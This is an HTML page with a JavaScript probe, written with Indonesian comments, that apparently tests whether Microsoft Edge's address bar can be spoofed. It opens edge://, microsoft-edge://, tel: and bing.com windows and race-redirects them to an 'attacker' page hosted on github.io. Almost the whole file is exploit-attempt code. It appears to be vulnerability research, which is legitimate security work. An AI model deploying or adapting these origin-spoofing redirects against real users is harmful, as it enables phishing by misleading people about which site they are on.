<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Edge Probe E - Edge Protocol Handlers</title></head>
<body>
<h3>Edge Probe E: Protocol handler spoofing (edge://, microsoft-edge://)</h3>
<p>Test: apakah protocol handler Edge bisa dimanipulasi untuk spoof origin?</p>
<button onclick="probe()">Mulai Probe</button>
<pre id="log"></pre>
<script>
function log(m){ document.getElementById('log').textContent += m + '\n'; }

function probe(){
  log('=== Edge Protocol Handler Probe ===');

  // 1. microsoft-edge:// protocol
  log('[1] microsoft-edge:// protocol...');
  try {
    var w = window.open('microsoft-edge://', '_blank');
    log('  -> Window: ' + (w ? 'OBJECT (cek address bar!)' : 'null'));
  } catch(e) { log('  -> Error: ' + e.message); }

  // 2. edge:// protocol — apakah bisa buka?
  log('[2] edge://version (cek apakah bisa buka internal page)...');
  try {
    var w2 = window.open('edge://version', '_blank');
    log('  -> Window: ' + (w2 ? 'OBJECT (address bar = edge://version?)' : 'null (blocked)'));
  } catch(e) { log('  -> Error: ' + e.message); }

  // 3. edge:// + race redirect ke attacker
  log('[3] edge:// + race redirect ke attacker...');
  try {
    var w3 = window.open('edge://favorites', '_blank');
    setTimeout(function(){
      try {
        w3.location = 'https://ikancupang29.github.io/edge-spoof-poc/edge-spoof-target.html';
        log('  -> REDIRECT BERHASIL! Cek address bar!');
        log('  -> Kalau address bar masih "edge://favorites" tapi konten = attacker = SPOOF!');
      } catch(e) { log('  -> Redirect blocked: ' + e.message); }
    }, 500);
  } catch(e) { log('  -> Error: ' + e.message); }

  // 4. window.open ke target + edge:// tab
  log('[4] Buka bing.com + redirect ke edge://...');
  try {
    var w4 = window.open('https://www.bing.com/', '_blank');
    setTimeout(function(){
      try {
        w4.location = 'edge://settings';
        log('  -> REDIRECT ke edge://settings BERHASIL! Cek address bar!');
        log('  -> Kalau address bar = bing.com tapi konten = edge://settings = SPOOF!');
      } catch(e) { log('  -> Redirect blocked: ' + e.message); }
    }, 600);
  } catch(e) { log('  -> Error: ' + e.message); }

  // 5. Cek tel: + redirect (Chrome-style spoof)
  log('[5] tel: protocol + redirect...');
  try {
    var w5 = window.open('tel:+1234567890', '_blank');
    setTimeout(function(){
      try {
        w5.location = 'https://ikancupang29.github.io/edge-spoof-poc/edge-spoof-target.html';
        log('  -> Redirect setelah tel: BERHASIL! Cek address bar!');
      } catch(e) { log('  -> Redirect blocked: ' + e.message); }
    }, 500);
  } catch(e) { log('  -> Error: ' + e.message); }

  log('\n=== SELESAI ===');
  log('Untuk SETIAP window baru yang terbuka:');
  log('  1. Cek address bar: nunjukin URL apa?');
  log('  2. Cek konten: halaman apa yang tampil?');
  log('  3. Kalau beda = POTENTIAL SPOOF (record video!)');
}
</script>
</body>
</html>
